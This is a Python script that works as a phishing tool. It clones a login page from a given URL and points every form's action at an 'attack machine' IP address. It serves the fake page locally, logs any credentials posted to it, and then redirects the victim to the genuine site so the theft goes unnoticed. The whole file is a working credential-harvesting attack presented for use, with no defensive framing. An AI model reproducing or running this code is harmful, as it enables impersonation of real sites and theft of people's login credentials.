from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore
import logging
import requests
import re
from bs4 import BeautifulSoup

url_to_scan=input("please give us the url you want to clone make sure it is a index login page\t")
response=requests.get(url_to_scan)

if response.status_code==200:
        with open("cloned.html",'w', encoding='utf-8') as file:
            file.write(response.text)
            

        print("the clone is successfull")

        ip=input("please provide us the ip address for this attack machine\t").strip()
         
        regex="(\d{1,3}\.){3}\d{1,3}"
        
        def update_the_form(html_content,url):
            parsed_content=BeautifulSoup(html_content,'html.parser')
            forms=parsed_content.find_all('form')

            for f in forms:
                form_action=f.get('action')

                if form_action:
                    f['action']=url
                
            
            return str(parsed_content)
        
        

        with open("cloned.html", 'r') as file :
            current_content=file.read()
        
        url="http://"+str(ip)+":8000/"

        modifed_html=update_the_form(current_content, url)

        with open("index.html", 'w', encoding='utf-8') as file:
            file.write(modifed_html)

        print("the page is served here "+ url)
       # if(re.match(regex,ip)):
      #              update_the_form(current_content,url)

        class S(BaseHTTPRequestHandler):

            def _set_response(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()

            

            def do_GET(self):
               
                self.path = '/index.html'
                try:
                    file_to_open = open(self.path[1:]).read()
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(bytes(file_to_open, 'utf-8'))
                except:
                    self.send_response(404)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'404 - Not Found')

            def do_POST(self):
               # print("called this")
                content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
                post_data = self.rfile.read(content_length).decode('utf-8') # <--- Gets the data itself
                print(Fore.RED,post_data)
                logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                        str(self.path), str(self.headers), post_data)

                
                self.send_response(303)
                self.send_header('Location', url_to_scan)
                #self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))
                self.end_headers()

        httpd = HTTPServer(('', 8000), S)
        print("Server started on port 8000...")
        httpd.serve_forever()